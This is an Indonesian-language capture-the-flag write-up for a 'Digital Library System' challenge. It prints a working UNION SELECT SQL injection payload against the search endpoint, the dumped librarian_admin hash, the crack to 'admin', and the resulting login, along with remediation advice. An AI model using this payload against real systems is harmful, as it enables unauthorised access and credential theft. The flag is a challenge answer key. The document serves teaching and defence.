# Proof Concept: Librarian Credentials Extraction

**Target:** Digital Library System

**Category:** SQL Injection / Information Disclosure

---

## 1. Deskripsi Challenge

Challenge meminta untuk menemukan kredensial login lengkap untuk akun librarian dengan format: 

username:password

Hint yang diberikan adalah **source code**, yang mengarahkan kita untuk menganalisis cara kerja aplikasi dan endpoint yang digunakan.

---

## 2. Analisis Masalah

Dari analisis source code (`app.js`), ditemukan bahwa proses login menggunakan endpoint berikut:

```
POST /backend/auth.php?action=login
```

Selain itu, ditemukan bahwa fitur pencarian buku rentan terhadap **SQL Injection**:

```
GET /backend/api.php?action=search&q=INPUT
```

Input dari user langsung dimasukkan ke dalam query SQL tanpa sanitasi yang baik, sehingga memungkinkan eksploitasi menggunakan UNION SELECT.

---

## 3. Langkah Penyelesaian (Exploitation)

### 1. Akses Browser

1. Buka aplikasi Digital Library System
2. Gunakan fitur search pada halaman utama

---

### 2. Eksploitasi SQL Injection

Masukkan payload berikut ke search bar:

```
%' UNION SELECT 1,username,password,4,5,6,7,8,9,10,11,12 FROM users-- %
```

---

### 3. Analisis Output

Dari hasil pencarian, akan muncul data tambahan dari database:

```
librarian_admin:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
```
<img width="715" height="956" alt="image" src="https://github.com/user-attachments/assets/1e861055-814c-4614-a20b-032f158b065c" />

---

### 4. Identifikasi Hash

Hash tersebut dikenali sebagai **SHA-256**.

Verifikasi dengan:

```
echo -n "admin" | sha256sum
```

Hasil: 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918

atau dapat menggunakan kalkulator hash SHA-256
<img width="1367" height="488" alt="image" src="https://github.com/user-attachments/assets/a94d293f-5148-466e-b1a8-69740aa13973" />


---

### 5. Login ke Sistem

Gunakan kredensial berikut:

```
username: librarian_admin
password: admin
```

Login berhasil dan sistem memberikan akses sebagai librarian (admin-level access).
<img width="975" height="818" alt="image" src="https://github.com/user-attachments/assets/a7568d45-abbd-4f93-a591-fcf0936e58d6" />

---

## 4. Solution

Untuk mencegah kerentanan seperti ini, beberapa langkah yang harus dilakukan:

1. **Gunakan Prepared Statement (Parameterized Query)**  
   Hindari menggabungkan input user langsung ke dalam query SQL. Gunakan prepared statement untuk memastikan input diperlakukan sebagai data, bukan query.

2. **Validasi dan Sanitasi Input**  
   Terapkan validasi input (whitelisting) dan sanitasi untuk mencegah karakter berbahaya seperti `'`, `"`, dan `--`.

3. **Gunakan ORM (Object Relational Mapping)**  
   Framework ORM seperti Sequelize atau Eloquent dapat membantu mencegah SQL Injection secara default.

4. **Hash Password dengan Algoritma Aman**  
   Gunakan algoritma hashing yang kuat seperti **bcrypt** atau **Argon2**, bukan SHA-256 tanpa salt.

5. **Batasi Error Message**  
   Jangan tampilkan error database secara langsung ke user karena dapat membantu attacker memahami struktur query.

6. **Implementasi Web Application Firewall (WAF)**  
   WAF dapat membantu mendeteksi dan memblokir payload berbahaya secara otomatis.

---

## 5. Flag

### librarian_admin:admin
<img width="665" height="305" alt="image" src="https://github.com/user-attachments/assets/ab7d5a36-2cf4-4d66-bbbe-ba2b19e82df3" />

---

### 6. CVSS Score
<img width="1435" height="501" alt="image" src="https://github.com/user-attachments/assets/7176edac-bf58-4854-b849-8ad6e60e86ee" />


